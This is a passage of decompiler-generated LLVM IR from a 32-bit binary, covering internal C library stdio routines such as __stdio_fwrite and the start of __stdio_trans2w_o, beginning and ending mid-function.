  %v6_8051cbd = icmp ugt i32 %v2_8051cb7, %v4_8051cde.pre
  br i1 %v6_8051cbd, label %dec_label_pc_8051cc1.preheader, label %dec_label_pc_8051cbf

dec_label_pc_8051cbf:                             ; preds = %dec_label_pc_8051cbb
  store i32 %v2_8051cb7, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051cc1.preheader

dec_label_pc_8051cc1.preheader:                   ; preds = %dec_label_pc_8051cbf, %dec_label_pc_8051cbb
  %v0_8051cc1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051cc1

dec_label_pc_8051cc1:                             ; preds = %dec_label_pc_8051cc1.preheader, %dec_label_pc_8051cd3
  %v2_8051cc3 = phi i32 [ %v1_8051cb7, %dec_label_pc_8051cc1.preheader ], [ %v1_8051ccf, %dec_label_pc_8051cd3 ]
  %v4_8051cc1 = phi i32 [ %v2_8051cb7, %dec_label_pc_8051cc1.preheader ], [ %v0_8051cc5, %dec_label_pc_8051cd3 ]
  %v0_8051cc1 = phi i32 [ %v0_8051cc1.pre, %dec_label_pc_8051cc1.preheader ], [ %v1_8051cd3, %dec_label_pc_8051cd3 ]
  %v1_8051cc1 = inttoptr i32 %v0_8051cc1 to i8*
  %v2_8051cc1 = load i8, i8* %v1_8051cc1, align 1
  %v3_8051cc1 = zext i8 %v2_8051cc1 to i32
  %v5_8051cc1 = and i32 %v4_8051cc1, -256
  %v6_8051cc1 = or i32 %v3_8051cc1, %v5_8051cc1
  store i32 %v6_8051cc1, i32* %eax.global-to-local, align 4
  %v3_8051cc3 = inttoptr i32 %v2_8051cc3 to i8*
  store i8 %v2_8051cc1, i8* %v3_8051cc3, align 1
  %v0_8051cc5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cc5 = trunc i32 %v0_8051cc5 to i8
  %v10_8051cc5 = icmp eq i8 %v1_8051cc5, 10
  %v1_8051cc7 = icmp eq i1 %v10_8051cc5, false
  br i1 %v1_8051cc7, label %dec_label_pc_8051ccf, label %dec_label_pc_8051cc9

dec_label_pc_8051cc9:                             ; preds = %dec_label_pc_8051cc1
  %v0_8051cc9 = load i32, i32* @edi, align 4
  %v1_8051cc9 = add i32 %v0_8051cc9, 1
  %v2_8051cc9 = inttoptr i32 %v1_8051cc9 to i8*
  %v3_8051cc9 = load i8, i8* %v2_8051cc9, align 1
  %v4_8051cc9 = urem i8 %v3_8051cc9, 2
  %v5_8051cc9 = icmp eq i8 %v4_8051cc9, 0
  %v1_8051ccd = icmp eq i1 %v5_8051cc9, false
  br i1 %v1_8051ccd, label %dec_label_pc_8051cc9.dec_label_pc_8051cd6_crit_edge, label %dec_label_pc_8051ccf

dec_label_pc_8051cc9.dec_label_pc_8051cd6_crit_edge: ; preds = %dec_label_pc_8051cc9
  %v0_8051cd6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051cd6

dec_label_pc_8051ccf:                             ; preds = %dec_label_pc_8051cc9, %dec_label_pc_8051cc1
  %v0_8051ccf = load i32, i32* @edx, align 4
  %v1_8051ccf = add i32 %v0_8051ccf, 1
  store i32 %v1_8051ccf, i32* @edx, align 4
  %v0_8051cd0 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051cd0 = add i32 %v0_8051cd0, -1
  %v8_8051cd0 = icmp eq i32 %v1_8051cd0, 0
  store i32 %v1_8051cd0, i32* %ebp.global-to-local, align 4
  br i1 %v8_8051cd0, label %dec_label_pc_8051ccf.dec_label_pc_8051cd6_crit_edge, label %dec_label_pc_8051cd3

dec_label_pc_8051ccf.dec_label_pc_8051cd6_crit_edge: ; preds = %dec_label_pc_8051ccf
  %v1_8051cd6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051cd6

dec_label_pc_8051cd3:                             ; preds = %dec_label_pc_8051ccf
  %v0_8051cd3 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051cd3 = add i32 %v0_8051cd3, 1
  store i32 %v1_8051cd3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051cc1

dec_label_pc_8051cd6:                             ; preds = %dec_label_pc_8051ccf.dec_label_pc_8051cd6_crit_edge, %dec_label_pc_8051cc9.dec_label_pc_8051cd6_crit_edge
  %v1_8051cd6 = phi i32 [ %v0_8051cc9, %dec_label_pc_8051cc9.dec_label_pc_8051cd6_crit_edge ], [ %v1_8051cd6.pre, %dec_label_pc_8051ccf.dec_label_pc_8051cd6_crit_edge ]
  %v0_8051cd6 = phi i32 [ %v0_8051cd6.pre, %dec_label_pc_8051cc9.dec_label_pc_8051cd6_crit_edge ], [ %v1_8051ccf, %dec_label_pc_8051ccf.dec_label_pc_8051cd6_crit_edge ]
  %v2_8051cd6 = add i32 %v1_8051cd6, 16
  %v3_8051cd6 = inttoptr i32 %v2_8051cd6 to i32*
  store i32 %v0_8051cd6, i32* %v3_8051cd6, align 4
  %v0_8051cd9 = load i32, i32* @edx, align 4
  %v1_8051cd9 = load i32, i32* @edi, align 4
  %v2_8051cd9 = add i32 %v1_8051cd9, 8
  %v3_8051cd9 = inttoptr i32 %v2_8051cd9 to i32*
  %v4_8051cd9 = load i32, i32* %v3_8051cd9, align 4
  %v5_8051cd9 = sub i32 %v0_8051cd9, %v4_8051cd9
  store i32 %v5_8051cd9, i32* @edx, align 4
  %v0_8051cdc = load i32, i32* @ebx, align 4
  %v2_8051cdc = sub i32 %v0_8051cdc, %v5_8051cd9
  br label %dec_label_pc_8051cde

dec_label_pc_8051cde:                             ; preds = %dec_label_pc_8051cad, %dec_label_pc_8051cd6
  %v4_8051cde = phi i32 [ %v2_8051cdc, %dec_label_pc_8051cd6 ], [ %v4_8051cde.pre, %dec_label_pc_8051cad ]
  %v5_8051cde = sub i32 %arg3, %v4_8051cde
  br label %dec_label_pc_8051ce2

dec_label_pc_8051ce2:                             ; preds = %dec_label_pc_8051ca7, %entry, %dec_label_pc_8051cde
  %stack_var_12.0 = phi i32 [ %v5_8051cde, %dec_label_pc_8051cde ], [ 0, %entry ], [ %arg3, %dec_label_pc_8051ca7 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_8051c73, i32* @ebx, align 4
  store i32 %v0_8051c71, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8051cd3, { 1, 0 }
  uselistorder i32 %v1_8051cd0, { 1, 0 }
  uselistorder i32 %v1_8051ccf, { 0, 2, 1 }
  uselistorder i32 %v0_8051cc5, { 1, 0 }
  uselistorder i32 %v2_8051ca9, { 1, 0 }
  uselistorder i32 %v2_8051ca7, { 1, 2, 0 }
  uselistorder i32 %v5_8051c9b, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8051ce2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051cde, { 1, 0 }
  uselistorder label %dec_label_pc_8051cc1, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051cf0 = load i32, i32* @ebp, align 4
  %v0_8051cf1 = load i32, i32* @edi, align 4
  %v0_8051cf2 = load i32, i32* @esi, align 4
  %v0_8051cf3 = load i32, i32* @ebx, align 4
  store i32 %v0_8051cf3, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8051d03 = add i32 %arg3, 1
  %v2_8051d03 = inttoptr i32 %v1_8051d03 to i8*
  %v3_8051d03 = load i8, i8* %v2_8051d03, align 1
  %v4_8051d03 = and i8 %v3_8051d03, 2
  %v5_8051d03 = icmp eq i8 %v4_8051d03, 0
  %v1_8051d07 = icmp eq i1 %v5_8051d03, false
  br i1 %v1_8051d07, label %dec_label_pc_8051dbe, label %dec_label_pc_8051d0d

dec_label_pc_8051d0d:                             ; preds = %entry
  %v1_8051d0d = add i32 %arg3, 4
  %v2_8051d0d = inttoptr i32 %v1_8051d0d to i32*
  %v3_8051d0d = load i32, i32* %v2_8051d0d, align 4
  %v13_8051d0d = icmp eq i32 %v3_8051d0d, -2
  %v1_8051d11 = add i32 %arg3, 16
  %v2_8051d11 = inttoptr i32 %v1_8051d11 to i32*
  %v3_8051d11 = load i32, i32* %v2_8051d11, align 4
  store i32 %v3_8051d11, i32* @edx, align 4
  %v1_8051d14 = add i32 %arg3, 12
  %v2_8051d14 = inttoptr i32 %v1_8051d14 to i32*
  %v3_8051d14 = load i32, i32* %v2_8051d14, align 4
  %v1_8051d17 = icmp eq i1 %v13_8051d0d, false
  %v2_8051d37 = sub i32 %v3_8051d14, %v3_8051d11
  store i32 %v2_8051d37, i32* %eax.global-to-local, align 4
  br i1 %v1_8051d17, label %dec_label_pc_8051d37, label %dec_label_pc_8051d19

dec_label_pc_8051d19:                             ; preds = %dec_label_pc_8051d0d
  %tmp22 = icmp ult i32 %v2_8051d37, %arg2
  br i1 %tmp22, label %dec_label_pc_8051d21, label %dec_label_pc_8051d23

dec_label_pc_8051d21:                             ; preds = %dec_label_pc_8051d19
  br label %dec_label_pc_8051d23

dec_label_pc_8051d23:                             ; preds = %dec_label_pc_8051d19, %dec_label_pc_8051d21
  %storemerge = phi i32 [ %v2_8051d37, %dec_label_pc_8051d21 ], [ %arg2, %dec_label_pc_8051d19 ]
  %v0_8051d24 = phi i32 [ %v2_8051d37, %dec_label_pc_8051d21 ], [ %arg2, %dec_label_pc_8051d19 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_8051d27 = inttoptr i32 %v3_8051d11 to i16*
  %v4_8051d27 = call i32 @memcpy(i16* %v3_8051d27, i32 %v0_8051d24, i32 %v2_8051d37)
  store i32 %v4_8051d27, i32* %eax.global-to-local, align 4
  %v0_8051d2c = load i32, i32* @ebx, align 4
  %v1_8051d2c = add i32 %v0_8051d2c, 16
  %v2_8051d2c = inttoptr i32 %v1_8051d2c to i32*
  %v3_8051d2c = load i32, i32* %v2_8051d2c, align 4
  %v4_8051d2c = load i32, i32* @esi, align 4
  %v5_8051d2c = add i32 %v4_8051d2c, %v3_8051d2c
  store i32 %v5_8051d2c, i32* %v2_8051d2c, align 4
  br label %dec_label_pc_8051dd6

dec_label_pc_8051d37:                             ; preds = %dec_label_pc_8051d0d
  %v6_8051d3b = icmp ult i32 %v2_8051d37, %arg2
  br i1 %v6_8051d3b, label %dec_label_pc_8051da5, label %dec_label_pc_8051d3d

dec_label_pc_8051d3d:                             ; preds = %dec_label_pc_8051d37
  %v0_8051d3d = load i32, i32* @ecx, align 4
  %v3_8051d41 = inttoptr i32 %v3_8051d11 to i16*
  %v4_8051d41 = call i32 @memcpy(i16* %v3_8051d41, i32 %arg2, i32 %v0_8051d3d)
  store i32 %v4_8051d41, i32* %eax.global-to-local, align 4
  %v0_8051d46 = load i32, i32* @ebx, align 4
  %v1_8051d46 = add i32 %v0_8051d46, 16
  %v2_8051d46 = inttoptr i32 %v1_8051d46 to i32*
  %v3_8051d46 = load i32, i32* %v2_8051d46, align 4
  %v4_8051d46 = load i32, i32* @edi, align 4
  %v5_8051d46 = add i32 %v4_8051d46, %v3_8051d46
  store i32 %v5_8051d46, i32* %v2_8051d46, align 4
  %v0_8051d4c = load i32, i32* @ebx, align 4
  %v1_8051d4c = add i32 %v0_8051d4c, 1
  %v2_8051d4c = inttoptr i32 %v1_8051d4c to i8*
  %v3_8051d4c = load i8, i8* %v2_8051d4c, align 1
  %v4_8051d4c = urem i8 %v3_8051d4c, 2
  %v5_8051d4c = icmp eq i8 %v4_8051d4c, 0
  br i1 %v5_8051d4c, label %dec_label_pc_8051dd6, label %dec_label_pc_8051d56

dec_label_pc_8051d56:                             ; preds = %dec_label_pc_8051d3d
  %v0_8051d56 = load i32, i32* @edx, align 4
  %v0_8051d57 = load i32, i32* @edi, align 4
  %v4_8051d5b = call i32 @memrchr(i8 10, i32 %v0_8051d57, i32 %v0_8051d56)
  store i32 %v4_8051d5b, i32* %eax.global-to-local, align 4
  %v1_8051d63 = icmp eq i32 %v4_8051d5b, 0
  br i1 %v1_8051d63, label %dec_label_pc_8051dd6, label %dec_label_pc_8051d67

dec_label_pc_8051d67:                             ; preds = %dec_label_pc_8051d56
  %v0_8051d6a = load i32, i32* @ebx, align 4
  %v1_8051d6b = call i32 @__stdio_wcommit(i32 %v0_8051d6a)
  store i32 %v1_8051d6b, i32* %eax.global-to-local, align 4
  %v1_8051d73 = icmp eq i32 %v1_8051d6b, 0
  br i1 %v1_8051d73, label %dec_label_pc_8051dd6, label %dec_label_pc_8051d77

dec_label_pc_8051d77:                             ; preds = %dec_label_pc_8051d67
  %v0_8051d77 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8051d77, %v1_8051d6b
  br i1 %tmp23, label %dec_label_pc_8051d7d, label %dec_label_pc_8051d7f

dec_label_pc_8051d7d:                             ; preds = %dec_label_pc_8051d77
  br label %dec_label_pc_8051d7f

dec_label_pc_8051d7f:                             ; preds = %dec_label_pc_8051d77, %dec_label_pc_8051d7d
  %storemerge24 = phi i32 [ %v1_8051d6b, %dec_label_pc_8051d7d ], [ %v0_8051d77, %dec_label_pc_8051d77 ]
  %v0_8051d86 = phi i32 [ %v1_8051d6b, %dec_label_pc_8051d7d ], [ %v0_8051d77, %dec_label_pc_8051d77 ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_8051d81 = sub i32 %v0_8051d77, %v0_8051d86
  store i32 %v2_8051d81, i32* %eax.global-to-local, align 4
  %v0_8051d83 = load i32, i32* @ebp, align 4
  %v2_8051d83 = add i32 %v0_8051d83, %v2_8051d81
  store i32 %v2_8051d83, i32* %ebp.global-to-local, align 4
  %v4_8051d8a = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_8051d86, i32 %v2_8051d81)
  store i32 %v4_8051d8a, i32* %eax.global-to-local, align 4
  store i32 %v4_8051d8a, i32* @edx, align 4
  %v1_8051d94 = icmp eq i32 %v4_8051d8a, 0
  br i1 %v1_8051d94, label %dec_label_pc_8051dd6, label %dec_label_pc_8051d98

dec_label_pc_8051d98:                             ; preds = %dec_label_pc_8051d7f
  %v0_8051d98 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051d98 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051d98 = sub i32 %v0_8051d98, %v4_8051d8a
  %v2_8051d9c = add i32 %v2_8051d98, %v1_8051d98
  store i32 %v2_8051d9c, i32* %eax.global-to-local, align 4
  %v0_8051d9e = load i32, i32* @ebx, align 4
  %v1_8051d9e = add i32 %v0_8051d9e, 16
  %v2_8051d9e = inttoptr i32 %v1_8051d9e to i32*
  %v3_8051d9e = load i32, i32* %v2_8051d9e, align 4
  %v5_8051d9e = sub i32 %v3_8051d9e, %v2_8051d9c
  store i32 %v5_8051d9e, i32* %v2_8051d9e, align 4
  %v0_8051da1 = load i32, i32* @edi, align 4
  %v1_8051da1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051da1 = sub i32 %v0_8051da1, %v1_8051da1
  store i32 %v2_8051da1, i32* @edi, align 4
  br label %dec_label_pc_8051dd6

dec_label_pc_8051da5:                             ; preds = %dec_label_pc_8051d37
  %v2_8051da5 = add i32 %arg3, 8
  %v3_8051da5 = inttoptr i32 %v2_8051da5 to i32*
  %v4_8051da5 = load i32, i32* %v3_8051da5, align 4
  %v15_8051da5 = icmp eq i32 %v3_8051d11, %v4_8051da5
  br i1 %v15_8051da5, label %dec_label_pc_8051dbe, label %dec_label_pc_8051daa

dec_label_pc_8051daa:                             ; preds = %dec_label_pc_8051da5
  %v1_8051dae = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8051dae, i32* %eax.global-to-local, align 4
  %v1_8051db6 = icmp eq i32 %v1_8051dae, 0
  br i1 %v1_8051db6, label %dec_label_pc_8051daa.dec_label_pc_8051dbe_crit_edge, label %dec_label_pc_8051dba

dec_label_pc_8051daa.dec_label_pc_8051dbe_crit_edge: ; preds = %dec_label_pc_8051daa
  %v0_8051dbe.pre = load i32, i32* @edi, align 4
  %v0_8051dc6.pre = load i32, i32* @ebx, align 4
  %v2_8051dcd.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8051dbe

dec_label_pc_8051dba:                             ; preds = %dec_label_pc_8051daa
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051dd6

dec_label_pc_8051dbe:                             ; preds = %dec_label_pc_8051daa.dec_label_pc_8051dbe_crit_edge, %dec_label_pc_8051da5, %entry
  %v2_8051dcd = phi i32 [ %v2_8051dcd.pre, %dec_label_pc_8051daa.dec_label_pc_8051dbe_crit_edge ], [ %v0_8051cf3, %dec_label_pc_8051da5 ], [ %v0_8051cf3, %entry ]
  %v0_8051dc6 = phi i32 [ %v0_8051dc6.pre, %dec_label_pc_8051daa.dec_label_pc_8051dbe_crit_edge ], [ %arg3, %dec_label_pc_8051da5 ], [ %arg3, %entry ]
  %v0_8051dbe = phi i32 [ %v0_8051dbe.pre, %dec_label_pc_8051daa.dec_label_pc_8051dbe_crit_edge ], [ %arg2, %dec_label_pc_8051da5 ], [ %arg2, %entry ]
  store i32 %v2_8051dcd, i32* @ebx, align 4
  store i32 %v0_8051cf1, i32* @edi, align 4
  %v4_8051dd1 = inttoptr i32 %v0_8051dc6 to i16*
  %v5_8051dd1 = call i32 @__stdio_WRITE(i16* %v4_8051dd1, i32 %v0_8051dbe, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051dd1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051dd6

dec_label_pc_8051dd6:                             ; preds = %dec_label_pc_8051d7f, %dec_label_pc_8051d67, %dec_label_pc_8051d56, %dec_label_pc_8051d3d, %dec_label_pc_8051dba, %dec_label_pc_8051d98, %dec_label_pc_8051d23, %dec_label_pc_8051dbe
  %v0_8051dd9 = load i32, i32* @edi, align 4
  store i32 %v0_8051dd9, i32* %eax.global-to-local, align 4
  %v2_8051ddb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051ddb, i32* @ebx, align 4
  store i32 %v0_8051cf2, i32* @esi, align 4
  store i32 %v0_8051cf1, i32* @edi, align 4
  store i32 %v0_8051cf0, i32* @ebp, align 4
  ret i32 %v0_8051dd9

; uselistorder directives
  uselistorder i32 %v2_8051d9c, { 1, 0 }
  uselistorder i32 %v4_8051d8a, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8051d81, { 1, 0, 2 }
  uselistorder i32 %v0_8051d77, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8051d37, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_8051cf1, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_8051dd6, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8051d7f, { 1, 0 }
  uselistorder label %dec_label_pc_8051d23, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051de0 = load i32, i32* @ebx, align 4
  %v4_8051de4 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051de4, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8051dec = bitcast i16* %arg1 to i32*
  %v2_8051dec = load i32, i32* %v1_8051dec, align 4
  store i32 %v2_8051dec, i32* %eax.global-to-local, align 4
  %v1_8051dee = urem i32 %v2_8051dec, 65536
  store i32 %v1_8051dee, i32* %edx.global-to-local, align 4
  %v2_8051df1 = and i32 %v1_8051dee, %arg2
  %v3_8051df1 = icmp eq i32 %v2_8051df1, 0
  %v1_8051df3 = icmp eq i1 %v3_8051df1, false
  br i1 %v1_8051df3, label %dec_label_pc_8051e02, label %dec_label_pc_8051df5

dec_label_pc_8051df5:                             ; preds = %entry
  %v1_8051df5 = and i32 %v2_8051dec, 2176
  %v2_8051df5 = icmp eq i32 %v1_8051df5, 0
  store i32 %v1_8051df5, i32* %edx.global-to-local, align 4
  %v1_8051dfb = icmp eq i1 %v2_8051df5, false
  br i1 %v1_8051dfb, label %dec_label_pc_8051e0a, label %dec_label_pc_8051dfd

dec_label_pc_8051dfd:                             ; preds = %dec_label_pc_8051df5
  %v2_8051dfd = or i32 %v2_8051dec, %arg2
  store i32 %v2_8051dfd, i32* %eax.global-to-local, align 4
  %v1_8051dff = trunc i32 %v2_8051dfd to i16
  store i16 %v1_8051dff, i16* %arg1, align 2
  %v0_8051e02.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051e02

dec_label_pc_8051e02:                             ; preds = %entry, %dec_label_pc_8051dfd
  %v0_8051e47 = phi i32 [ %v4_8051de4, %entry ], [ %v0_8051e02.pre, %dec_label_pc_8051dfd ]
  %v1_8051e02 = inttoptr i32 %v0_8051e47 to i16*
  %v2_8051e02 = load i16, i16* %v1_8051e02, align 2
  %v3_8051e02 = zext i16 %v2_8051e02 to i32
  store i32 %v3_8051e02, i32* %edx.global-to-local, align 4
  %v2_8051e05 = and i16 %v2_8051e02, 32
  %v3_8051e05 = icmp eq i16 %v2_8051e05, 0
  br i1 %v3_8051e05, label %dec_label_pc_8051e1e, label %dec_label_pc_8051e0a

dec_label_pc_8051e0a:                             ; preds = %dec_label_pc_8051e02, %dec_label_pc_8051df5
  %v1_8051e0a = call i32 @__errno_location(i32 %v0_8051de0)
  store i32 %v1_8051e0a, i32* %eax.global-to-local, align 4
  %v1_8051e0f = inttoptr i32 %v1_8051e0a to i32*
  store i32 9, i32* %v1_8051e0f, align 4
  br label %dec_label_pc_8051e15

dec_label_pc_8051e15:                             ; preds = %dec_label_pc_8051e35, %dec_label_pc_8051e0a
  %v0_8051e15 = load i32, i32* @ebx, align 4
  %v1_8051e15 = inttoptr i32 %v0_8051e15 to i16*
  %v2_8051e15 = load i16, i16* %v1_8051e15, align 2
  %v3_8051e15 = or i16 %v2_8051e15, 8
  store i16 %v3_8051e15, i16* %v1_8051e15, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051e78

dec_label_pc_8051e1e:                             ; preds = %dec_label_pc_8051e02
  %v2_8051e1e = urem i16 %v2_8051e02, 4
  %v3_8051e1e = icmp eq i16 %v2_8051e1e, 0
  br i1 %v3_8051e1e, label %dec_label_pc_8051e64, label %dec_label_pc_8051e23

dec_label_pc_8051e23:                             ; preds = %dec_label_pc_8051e1e
  %v2_8051e23 = and i32 %v3_8051e02, 4
  %v3_8051e23 = icmp eq i32 %v2_8051e23, 0
  %v1_8051e26 = icmp eq i1 %v3_8051e23, false
  br i1 %v1_8051e26, label %dec_label_pc_8051e54, label %dec_label_pc_8051e28

dec_label_pc_8051e28:                             ; preds = %dec_label_pc_8051e23
  %v1_8051e28 = add i32 %v0_8051e47, 20
  %v2_8051e28 = inttoptr i32 %v1_8051e28 to i32*
  %v3_8051e28 = load i32, i32* %v2_8051e28, align 4
  store i32 %v3_8051e28, i32* %eax.global-to-local, align 4
  %v2_8051e2b = add i32 %v0_8051e47, 16
  %v3_8051e2b = inttoptr i32 %v2_8051e2b to i32*
  %v4_8051e2b = load i32, i32* %v3_8051e2b, align 4
  %v15_8051e2b = icmp eq i32 %v3_8051e28, %v4_8051e2b
  %v1_8051e2e = icmp eq i1 %v15_8051e2b, false
  br i1 %v1_8051e2e, label %dec_label_pc_8051e35, label %dec_label_pc_8051e30

dec_label_pc_8051e30:                             ; preds = %dec_label_pc_8051e28
  %v2_8051e30 = and i32 %v3_8051e02, 2
  %v3_8051e30 = icmp eq i32 %v2_8051e30, 0
  br i1 %v3_8051e30, label %dec_label_pc_8051e54, label %dec_label_pc_8051e35

dec_label_pc_8051e35:                             ; preds = %dec_label_pc_8051e30, %dec_label_pc_8051e28
  %v1_8051e35 = and i32 %v3_8051e02, 1024
  store i32 %v1_8051e35, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_8051e35, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_8051e48 = call i32 @__GI_fseek(i32 %v0_8051e47, i32 0, i32 %tmp17, i32 %v1_8051e35)
  store i32 %v5_8051e48, i32* %eax.global-to-local, align 4
  %v1_8051e50 = icmp eq i32 %v5_8051e48, 0
  %v1_8051e52 = icmp eq i1 %v1_8051e50, false
  br i1 %v1_8051e52, label %dec_label_pc_8051e15, label %dec_label_pc_8051e35.dec_label_pc_8051e54_crit_edge

dec_label_pc_8051e35.dec_label_pc_8051e54_crit_edge: ; preds = %dec_label_pc_8051e35
  %v0_8051e54.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051e54

dec_label_pc_8051e54:                             ; preds = %dec_label_pc_8051e35.dec_label_pc_8051e54_crit_edge, %dec_label_pc_8051e30, %dec_label_pc_8051e23
  %v10_8051e54 = phi i32 [ %v0_8051e54.pre, %dec_label_pc_8051e35.dec_label_pc_8051e54_crit_edge ], [ %v0_8051e47, %dec_label_pc_8051e30 ], [ %v0_8051e47, %dec_label_pc_8051e23 ]
  %v1_8051e54 = inttoptr i32 %v10_8051e54 to i16*
  %v2_8051e54 = load i16, i16* %v1_8051e54, align 2
  %v3_8051e54 = and i16 %v2_8051e54, -4
  store i16 %v3_8051e54, i16* %v1_8051e54, align 2
  %v0_8051e58 = load i32, i32* @ebx, align 4
  %v1_8051e58 = add i32 %v0_8051e58, 8
  %v2_8051e58 = inttoptr i32 %v1_8051e58 to i32*
  %v3_8051e58 = load i32, i32* %v2_8051e58, align 4
  store i32 %v3_8051e58, i32* %eax.global-to-local, align 4
  %v2_8051e5b = add i32 %v0_8051e58, 24
  %v3_8051e5b = inttoptr i32 %v2_8051e5b to i32*
  store i32 %v3_8051e58, i32* %v3_8051e5b, align 4
  %v0_8051e5e = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e5e = load i32, i32* @ebx, align 4
  %v2_8051e5e = add i32 %v1_8051e5e, 16
  %v3_8051e5e = inttoptr i32 %v2_8051e5e to i32*
  store i32 %v0_8051e5e, i32* %v3_8051e5e, align 4
  %v0_8051e61 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e61 = load i32, i32* @ebx, align 4
  %v2_8051e61 = add i32 %v1_8051e61, 20
  %v3_8051e61 = inttoptr i32 %v2_8051e61 to i32*
  store i32 %v0_8051e61, i32* %v3_8051e61, align 4
  %v0_8051e64.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051e64

dec_label_pc_8051e64:                             ; preds = %dec_label_pc_8051e1e, %dec_label_pc_8051e54
  %v9_8051e64 = phi i32 [ %v0_8051e47, %dec_label_pc_8051e1e ], [ %v0_8051e64.pre, %dec_label_pc_8051e54 ]
  %v1_8051e64 = inttoptr i32 %v9_8051e64 to i16*
  %v2_8051e64 = load i16, i16* %v1_8051e64, align 2
  %v3_8051e64 = or i16 %v2_8051e64, 64
  store i16 %v3_8051e64, i16* %v1_8051e64, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051e6a = load i32, i32* @ebx, align 4
  %v1_8051e6a = inttoptr i32 %v0_8051e6a to i16*
  %v2_8051e6a = load i16, i16* %v1_8051e6a, align 2
  %v3_8051e6a = zext i16 %v2_8051e6a to i32
  store i32 %v3_8051e6a, i32* %eax.global-to-local, align 4
  %v3_8051e6d = and i16 %v2_8051e6a, 2816
  %v4_8051e6d = icmp eq i16 %v3_8051e6d, 0
  %v1_8051e70 = icmp eq i1 %v4_8051e6d, false
  br i1 %v1_8051e70, label %dec_label_pc_8051e78, label %dec_label_pc_8051e72

dec_label_pc_8051e72:                             ; preds = %dec_label_pc_8051e64
  %v1_8051e72 = add i32 %v0_8051e6a, 12
  %v2_8051e72 = inttoptr i32 %v1_8051e72 to i32*
  %v3_8051e72 = load i32, i32* %v2_8051e72, align 4
  store i32 %v3_8051e72, i32* %eax.global-to-local, align 4
  %v2_8051e75 = add i32 %v0_8051e6a, 28
  %v3_8051e75 = inttoptr i32 %v2_8051e75 to i32*
  store i32 %v3_8051e72, i32* %v3_8051e75, align 4
  %v0_8051e78.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051e78

dec_label_pc_8051e78:                             ; preds = %dec_label_pc_8051e64, %dec_label_pc_8051e15, %dec_label_pc_8051e72
  %v0_8051e78 = phi i32 [ 0, %dec_label_pc_8051e64 ], [ -1, %dec_label_pc_8051e15 ], [ %v0_8051e78.pre, %dec_label_pc_8051e72 ]
  store i32 %v0_8051e78, i32* %eax.global-to-local, align 4
  %v2_8051e7a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051e7a, i32* %edx.global-to-local, align 4
